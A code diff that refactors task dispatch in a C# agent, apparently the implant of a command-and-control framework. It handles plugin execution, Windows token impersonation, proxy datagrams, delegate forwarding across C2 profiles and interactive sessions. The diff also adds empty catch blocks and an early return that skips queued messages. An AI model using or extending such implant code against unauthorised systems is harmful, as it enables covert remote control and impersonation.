@@ -56,23 +56,7 @@ namespace Agent.Managers
                     break;
                 default:
                     IPlugin plug;
-
-                    if (this.assemblyManager.TryGetPlugin(job.task.command, out plug))
-                    {
-                        if (job.task.token != 0 && OperatingSystem.IsWindows())
-                        {
-                            await WindowsIdentity.RunImpersonated(this.tokenManager.GetImpersonationContext(job.task.token), async () =>
-                            {
-                                plug.Execute(job);
-                            });
-                        }
-                        else
-                        {
-                            plug.Execute(job);
-                        }
-                            
-                    }
-                    else
+                    if(!this.assemblyManager.TryGetPlugin(job.task.command, out plug))
                     {
                         await this.messageManager.AddResponse(new ResponseResult()
                         {
@@ -81,7 +65,37 @@ namespace Agent.Managers
                             status = "error",
                             completed = true,
                         });
+                        break;
                     }
+
+                    _ = Task.Run(() =>
+                    {
+                        try
+                        {
+                            if (job.task.token != 0 && OperatingSystem.IsWindows())
+                            {
+                                WindowsIdentity.RunImpersonated(this.tokenManager.GetImpersonationContext(job.task.token), async () =>
+                                {
+                                    plug.Execute(job);
+                                });
+                            }
+                            else
+                            {
+                                plug.Execute(job);
+                            }
+                        }
+                        catch (Exception e)
+                        {
+                            this.messageManager.AddResponse(new ResponseResult()
+                            {
+                                task_id = job.task.id,
+                                process_response = new Dictionary<string, string> { { "message", e.Message } },
+                                status = "error",
+                                completed = true,
+                            });
+                        }
+                    });
+                            
                     break;
             }
         }
@@ -91,45 +105,61 @@ namespace Agent.Managers
             {
                 ServerJob job;
 
-                if(!this.messageManager.TryGetJob(response.task_id, out job))
+                if(!this.messageManager.TryGetJob(response.task_id, out job) || !this.assemblyManager.TryGetPlugin<IFilePlugin>(job.task.command, out var plugin))
                 {
                     return;
                 }
 
-                if (this.assemblyManager.TryGetPlugin<IFilePlugin>(job.task.command, out var plugin))
+                if (job.task.token > 0 && OperatingSystem.IsWindows())
                 {
-                    if (job.task.token > 0 && OperatingSystem.IsWindows())
+                    await WindowsIdentity.RunImpersonated(this.tokenManager.GetImpersonationContext(job.task.token), async () =>
                     {
-                        await WindowsIdentity.RunImpersonated(this.tokenManager.GetImpersonationContext(job.task.token), async () =>
+                        try
                         {
                             plugin.HandleNextMessage(response);
-                        });
-                    }
-                    else
-                    {
-                        plugin.HandleNextMessage(response);
-                    }
+                        }
+                        catch { }
+                    });
+                    return;
                 }
+
+                try
+                {
+                    plugin.HandleNextMessage(response);
+                }
+                catch { }
             });
         }
         public async Task HandleProxyResponses(string type, List<ServerDatagram> responses)
         {
-            if (this.assemblyManager.TryGetPlugin<IProxyPlugin>(type, out var plugin))
+            if (!this.assemblyManager.TryGetPlugin<IProxyPlugin>(type, out var plugin))
             {
-                Parallel.ForEach(responses, async response =>
+                return;
+            }
+
+            Parallel.ForEach(responses, async response =>
+            {
+                try
                 {
                     plugin.HandleDatagram(response);
-                });
-            }
+                }
+                catch { }
+            });
         }
         public async Task HandleDelegateResponses(List<DelegateMessage> responses)
         {
             foreach(var response in responses)
             {
-                if (this.assemblyManager.TryGetPlugin<IForwarderPlugin>(response.c2_profile, out var plugin))
+                if (!this.assemblyManager.TryGetPlugin<IForwarderPlugin>(response.c2_profile, out var plugin))
+                {
+                    return;
+                }
+
+                try
                 {
                     plugin.ForwardDelegate(response);
                 }
+                catch { }
             }
         }
         public async Task HandleInteractiveResponses(List<InteractMessage> responses)
@@ -138,25 +168,31 @@ namespace Agent.Managers
             {
                 ServerJob job;
 
-                if (!this.messageManager.TryGetJob(response.task_id, out job))
+                if (!this.messageManager.TryGetJob(response.task_id, out job) || !this.assemblyManager.TryGetPlugin<IInteractivePlugin>(job.task.command, out var plugin))
                 {
                     return;
                 }
 
-                if (this.assemblyManager.TryGetPlugin<IInteractivePlugin>(job.task.command, out var plugin))
+                if (job.task.token > 0 && OperatingSystem.IsWindows())
                 {
-                    if (job.task.token > 0 && OperatingSystem.IsWindows())
+                    await WindowsIdentity.RunImpersonated(this.tokenManager.GetImpersonationContext(job.task.token), async () =>
                     {
-                        await WindowsIdentity.RunImpersonated(this.tokenManager.GetImpersonationContext(job.task.token), async () =>
+                        try
                         {
                             plugin.Interact(response);
-                        });
-                    }
-                    else
-                    {
-                        plugin.Interact(response);
-                    }
+                        }
+                        catch { }
+                    });
+
+                    return;
                 }
+
+                try
+                {
+                    plugin.Interact(response);
+                }
+                catch { }
+
             });
         }
     }
